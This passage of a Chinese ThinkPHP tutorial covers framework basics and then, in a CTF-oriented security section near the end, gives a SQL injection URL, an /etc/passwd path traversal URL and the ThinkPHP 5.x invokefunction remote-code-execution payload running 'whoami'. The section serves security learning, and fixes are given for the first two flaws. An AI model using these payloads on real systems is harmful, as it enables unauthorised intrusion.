href="#thinkphp-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">ThinkPHP 漏洞利用方法</a></p><ul><li><p><a href="#sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">1. SQL 注入攻击</a>   </p></li><li><p><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB">2. 远程代码执行攻击</a>   </p></li><li><p><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB">3. 路径遍历攻击</a>   </p></li><li><p><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB">4. 反序列化攻击</a></p></li></ul></li><li><p><a href="#thinkphp-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">ThinkPHP 安全防御措施</a></p></li><li><p><a href="#%E7%89%88%E6%9C%AC%E5%8E%86%E5%8F%B2%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">版本历史与漏洞总结</a></p></li><li><p><a href="#ctf-%E9%A2%98%E7%9B%AE%E4%B8%AD%E7%9A%84-thinkphp-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">CTF 题目中的 ThinkPHP 漏洞总结</a></p><ul><li><p><a href="#cve-2018-20062---thinkphp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">1. <strong>CVE-2018-20062</strong> - ThinkPHP 远程代码执行漏洞</a>  </p></li><li><p><a href="#cve-2019-9082---thinkphp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">2. <strong>CVE-2019-9082</strong> - ThinkPHP 远程代码执行漏洞</a>   </p></li><li><p><a href="#cve-2018-19518---thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">3. <strong>CVE-2018-19518</strong> - ThinkPHP 反序列化远程代码执行漏洞</a>  </p></li><li><p><a href="#cve-2018-1000861---thinkphp-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">4. <strong>CVE-2018-1000861</strong> - ThinkPHP 模板注入漏洞</a>   </p></li><li><p><a href="#cve-2019-8018---thinkphp-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">5. <strong>CVE-2019-8018</strong> - ThinkPHP SQL 注入漏洞</a>   </p></li><li><p><a href="#cve-2019-7481---thinkphp-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">6. <strong>CVE-2019-7481</strong> - ThinkPHP 后台文件上传漏洞</a></p></li></ul></li></ol><hr><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>ThinkPHP 的标准项目目录结构如下：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs axapta">application/            <span class="hljs-meta"># 应用目录，包含控制器、模型、视图等</span><br>├── controller/         <span class="hljs-meta"># 控制器目录</span><br>├── model/              <span class="hljs-meta"># 模型目录</span><br>├── view/               <span class="hljs-meta"># 视图目录</span><br>├── <span class="hljs-keyword">common</span>/             <span class="hljs-meta"># 公共目录，存放公共类、函数等</span><br>├── config/             <span class="hljs-meta"># 配置文件目录</span><br>├── route/              <span class="hljs-meta"># 路由配置目录</span><br><span class="hljs-keyword">public</span>/                 <span class="hljs-meta"># Web 公开目录，包含入口文件</span><br>vendor/                 <span class="hljs-meta"># 第三方依赖库（通过 Composer 管理）</span><br>runtime/                <span class="hljs-meta"># 缓存、日志等临时文件目录</span><br>thinkphp/               <span class="hljs-meta"># ThinkPHP 核心框架目录</span><br></code></pre></td></tr></table></figure><ul><li>**application&#x2F;**：存放应用逻辑，如控制器、模型、视图等。</li><li>**public&#x2F;**：存放项目的入口文件（如 <code>index.php</code>）和公开资源。</li><li>**runtime&#x2F;**：用于存放日志、缓存等临时文件。</li><li>**vendor&#x2F;**：使用 Composer 管理的第三方库。</li><li>**thinkphp&#x2F;**：ThinkPHP 框架的核心代码。</li></ul><hr><h3 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h3><h4 id="创建控制器"><a href="#创建控制器" class="headerlink" title="创建控制器"></a>创建控制器</h4><p><strong>控制器</strong> 是 ThinkPHP 处理用户请求的核心部分，负责业务逻辑的处理。控制器文件位于 <code>application/controller/</code> 目录中。</p><ol><li>在 <code>application/controller/</code> 目录下创建控制器文件 <code>Index.php</code>：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> application/controller/Index.php<br></code></pre></td></tr></table></figure><ol start="2"><li>在控制器文件中编写基本代码：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, ThinkPHP!&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;World&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> . <span class="hljs-variable">$name</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>访问控制器：<ul><li>访问 <code>http://localhost/index.php/index/index</code> 将会输出 <code>Hello, ThinkPHP!</code>。</li><li>访问 <code>http://localhost/index.php/index/hello/name/ThinkPHP</code> 将会输出 <code>Hello, ThinkPHP!</code>。</li></ul></li></ol><hr><h4 id="配置路由"><a href="#配置路由" class="headerlink" title="配置路由"></a>配置路由</h4><p>路由定义了 URL 与控制器&#x2F;方法的映射关系。ThinkPHP 的路由配置文件位于 <code>route/route.php</code>。</p><ol><li>配置路由文件 <code>route/route.php</code>，定义路由规则：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Route</span>;<br><br><span class="hljs-comment">// 定义一个 GET 路由</span><br><span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;hello/:name&#x27;</span>, <span class="hljs-string">&#x27;index/hello&#x27;</span>);<br></code></pre></td></tr></table></figure><ol start="2"><li>访问 <code>http://localhost/hello/ThinkPHP</code> 将会调用 <code>IndexController</code> 中的 <code>hello</code> 方法，并返回 <code>Hello, ThinkPHP</code>。</li></ol><hr><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>ThinkPHP 提供了强大的 ORM 功能，方便与数据库交互。在开始数据库操作前，首先需要配置数据库连接。</p><h4 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h4><ol><li>配置数据库连接信息，修改 <code>config/database.php</code> 文件：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> [<br>    <span class="hljs-comment">// 数据库类型</span><br>    <span class="hljs-string">&#x27;type&#x27;</span>        =&gt; <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>    <span class="hljs-comment">// 服务器地址</span><br>    <span class="hljs-string">&#x27;hostname&#x27;</span>    =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-comment">// 数据库名</span><br>    <span class="hljs-string">&#x27;database&#x27;</span>    =&gt; <span class="hljs-string">&#x27;thinkphp&#x27;</span>,<br>    <span class="hljs-comment">// 用户名</span><br>    <span class="hljs-string">&#x27;username&#x27;</span>    =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-comment">// 密码</span><br>    <span class="hljs-string">&#x27;password&#x27;</span>    =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-comment">// 端口</span><br>    <span class="hljs-string">&#x27;hostport&#x27;</span>    =&gt; <span class="hljs-string">&#x27;3306&#x27;</span>,<br>];<br></code></pre></td></tr></table></figure><hr><h4 id="创建模型"><a href="#创建模型" class="headerlink" title="创建模型"></a>创建模型</h4><p>模型对应数据库表，处理数据的增删改查操作。默认情况下，模型名对应数据库表名（小写）。</p><ol><li>在 <code>application/model/</code> 目录下创建模型文件 <code>User.php</code>：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> application/model/User.php<br></code></pre></td></tr></table></figure><ol start="2"><li>编写模型类代码：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">model</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// 指定数据库表名</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;user&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>在控制器中使用模型进行数据查询：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">model</span>\<span class="hljs-title">User</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUser</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 查询 ID 为 1 的用户</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">find</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$user</span>);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="视图和模板"><a href="#视图和模板" class="headerlink" title="视图和模板"></a>视图和模板</h3><p>视图负责显示数据，通常由 HTML 模板组成。视图文件存放在 <code>application/view/</code> 目录下，模板文件的命名需与控制器和方法名一致。</p><h4 id="创建视图文件"><a href="#创建视图文件" class="headerlink" title="创建视图文件"></a>创建视图文件</h4><ol><li>在 <code>application/view/index/</code> 目录下创建视图文件 <code>index.html</code>：</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ThinkPHP<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;$name&#125;!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="渲染视图"><a href="#渲染视图" class="headerlink" title="渲染视图"></a>渲染视图</h4><p>控制器可以通过 <code>view()</code> 方法渲染视图文件，并传递数据到视图。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;ThinkPHP&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>(<span class="hljs-string">&#x27;index&#x27;</span>, [<span class="hljs-string">&#x27;name&#x27;</span> =&gt; <span class="hljs-variable">$name</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>访问 <code>http://localhost/index/index</code> 时，将显示 <code>Hello, ThinkPHP!</code>。</p><hr><h3 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h3><p>表单验证用于验证用户输入的数据，确保其合法性。ThinkPHP 提供了强大的验证机制。</p><h4 id="创建验证器"><a href="#创建验证器" class="headerlink" title="创建验证器"></a>创建验证器</h4><ol><li>在 <code>application/validate/</code> 目录下创建验证器文件 <code>User.php</code>：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">validate</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Validate</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Validate</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// 定义验证规则</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$rule</span> = [<br>        <span class="hljs-string">&#x27;name&#x27;</span>  =&gt; <span class="hljs-string">&#x27;require|max:25&#x27;</span>,<br>        <span class="hljs-string">&#x27;email&#x27;</span> =&gt; <span class="hljs-string">&#x27;email&#x27;</span>,<br>    ];<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="使用验证器"><a href="#使用验证器" class="headerlink" title="使用验证器"></a>使用验证器</h4><p>在控制器中使用验证器来验证用户输入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">validate</span>\<span class="hljs-title">User</span> <span class="hljs-keyword">as</span> <span class="hljs-title">UserValidate</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">saveUser</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$data</span> = [<br>        <span class="hljs-string">&#x27;name&#x27;</span>  =&gt; <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;post.name&#x27;</span>),<br>        <span class="hljs-string">&#x27;email&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;post.email&#x27;</span>),<br>    ];<br><br>    <span class="hljs-variable">$validate</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserValidate</span>();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$validate</span>-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$data</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$validate</span>-&gt;<span class="hljs-title function_ invoke__">getError</span>();  <span class="hljs-comment">// 返回验证错误</span><br>    &#125;<br><br>    <span class="hljs-comment">// 验证通过后执行其他操作</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="错误和日志"><a href="#错误和日志" class="headerlink" title="错误和日志"></a>错误和日志</h3><p>ThinkPHP 提供了简单的错误处理机制，并支持日志记录。</p><h4 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h4><ol><li>自定义错误页面：可以在配置文件中自定义异常处理模板：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// config/app.php</span><br><span class="hljs-string">&#x27;exception_tmpl&#x27;</span> =&gt; \think\facade<span class="hljs-title class_">\App</span>::<span class="hljs-title function_ invoke__">getAppPath</span>() . <span class="hljs-string">&#x27;view/error.html&#x27;</span>,<br></code></pre></td></tr></table></figure><ol start="2"><li>定义自定义的错误页面 <code>application/view/error.html</code>：</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>An error occurred<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;$message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h4><p>日志记录可以帮助开发者跟踪系统中的异常与调试信息。日志文件保存在 <code>runtime/log/</code> 目录中。</p><ol><li>在控制器中记录日志：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Log</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title class_">Log</span>::<span class="hljs-title function_ invoke__">record</span>(<span class="hljs-string">&#x27;这是一个调试信息&#x27;</span>, <span class="hljs-string">&#x27;debug&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;日志已记录&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>查看日志：日志文件会保存在 <code>runtime/log/</code> 目录下。</li></ol><hr><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><p>在部署之前，确保配置好不同的环境参数，比如数据库连接、调试模式等。</p><ol><li>修改 <code>.env</code> 文件，配置生产环境参数：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs env">APP_DEBUG = false<br>DB_HOST = 127.0.0.1<br>DB_NAME = production_db<br>DB_USER = prod_user<br>DB_PASS = prod_pass<br></code></pre></td></tr></table></figure><h4 id="配置-Web-服务器"><a href="#配置-Web-服务器" class="headerlink" title="配置 Web 服务器"></a>配置 Web 服务器</h4><p>ThinkPHP 项目需要部署在 Web 服务器上，如 <strong>Apache</strong> 或 <strong>Nginx</strong>。</p><p><strong>Nginx 配置示例</strong>：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> yourdomain.com<br></code></pre></td></tr></table></figure><h3 id="ThinkPHP-框架架构与基础概念"><a href="#ThinkPHP-框架架构与基础概念" class="headerlink" title="ThinkPHP 框架架构与基础概念"></a>ThinkPHP 框架架构与基础概念</h3><p>ThinkPHP 是一个基于 MVC（Model-View-Controller）模式的 PHP 框架。其核心概念如下：</p><ul><li><strong>Model（模型）</strong>：负责与数据库交互，执行数据的增删改查操作。</li><li><strong>View（视图）</strong>：负责展示数据，并将结果输出给用户。</li><li><strong>Controller（控制器）</strong>：负责逻辑处理，协调模型和视图的交互。</li></ul><h4 id="1-路由机制"><a href="#1-路由机制" class="headerlink" title="1. 路由机制"></a>1. 路由机制</h4><p>ThinkPHP 的路由机制决定了 URL 如何映射到具体的控制器和操作。默认情况下，ThinkPHP 通过 URL 的路径结构来决定加载哪个控制器和方法。例如，<code>index.php?m=module&amp;a=action</code> 将会调用 <code>module</code> 模块下的 <code>action</code> 方法。</p><p>如果不当处理 URL 及其参数，可能会导致路径遍历、SQL 注入和远程代码执行等安全问题。</p><hr><h3 id="ThinkPHP-常见的安全漏洞"><a href="#ThinkPHP-常见的安全漏洞" class="headerlink" title="ThinkPHP 常见的安全漏洞"></a>ThinkPHP 常见的安全漏洞</h3><p>在 CTF 比赛中，ThinkPHP 的漏洞主要集中在以下几个方面：</p><h4 id="1-SQL-注入漏洞"><a href="#1-SQL-注入漏洞" class="headerlink" title="1.SQL 注入漏洞"></a>1.SQL 注入漏洞</h4><p>SQL 注入是指攻击者通过构造恶意的输入，破坏应用程序执行的 SQL 查询。虽然 ThinkPHP 提供了 ORM 和预处理机制，避免直接拼接 SQL 语句，但是如果开发者直接使用原生 SQL 查询且未做适当的过滤，则可能会引发 SQL 注入。</p><p><strong>漏洞示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不安全的 SQL 查询</span><br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">M</span>(<span class="hljs-string">&#x27;User&#x27;</span>);<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE id = &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>在上述代码中，<code>$_GET[&#39;id&#39;]</code> 的值未经过滤就被插入到了 SQL 查询中，攻击者可以通过构造如下 URL 进行 SQL 注入：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">OR</span> <span class="hljs-attribute">1</span>=1 --<br></code></pre></td></tr></table></figure><p><strong>修复方法</strong>：</p><ul><li>使用框架提供的 ORM：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])-&gt;<span class="hljs-title function_ invoke__">select</span>();<br></code></pre></td></tr></table></figure></li><li>或者使用 PDO 进行参数化查询，避免 SQL 注入。</li></ul><h4 id="2-路径遍历漏洞"><a href="#2-路径遍历漏洞" class="headerlink" title="2.路径遍历漏洞"></a>2.路径遍历漏洞</h4><p>路径遍历是指攻击者通过操纵文件路径的输入，访问服务器上未经授权的文件。ThinkPHP 的路由机制在处理不当输入时，可能导致文件包含和路径遍历漏洞。</p><p><strong>漏洞示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不安全的文件加载</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] . <span class="hljs-string">&#x27;.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>攻击者可以通过构造如下 URL 来读取系统的敏感文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?page=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><p><strong>防御措施</strong>：</p><ul><li>严格限制输入的文件路径，使用 <code>realpath()</code> 等函数校验路径是否合法。</li><li>使用白名单机制，只允许加载特定的文件。</li></ul><h4 id="3-远程代码执行（RCE）"><a href="#3-远程代码执行（RCE）" class="headerlink" title="3 .远程代码执行（RCE）"></a>3 .远程代码执行（RCE）</h4><p>ThinkPHP 的某些版本存在远程代码执行漏洞，允许攻击者通过构造恶意请求执行任意代码。在 ThinkPHP 5.x 系列中，某些版本允许调用 PHP 函数，攻击者可以通过调用 <code>call_user_func_array</code> 等函数来执行操作系统命令。</p><p><strong>漏洞示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span>[0]=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span>[1][]=<span class="hljs-title">whoami</span></span><br></code></pre></td></tr></table></figure><p>该漏洞利用框架的内部调用机制，调用 <code>system</code> 函数执行命令 <code>whoami</code>，返回服务器的用户信息。</p><h5 id="受影响版本："><a 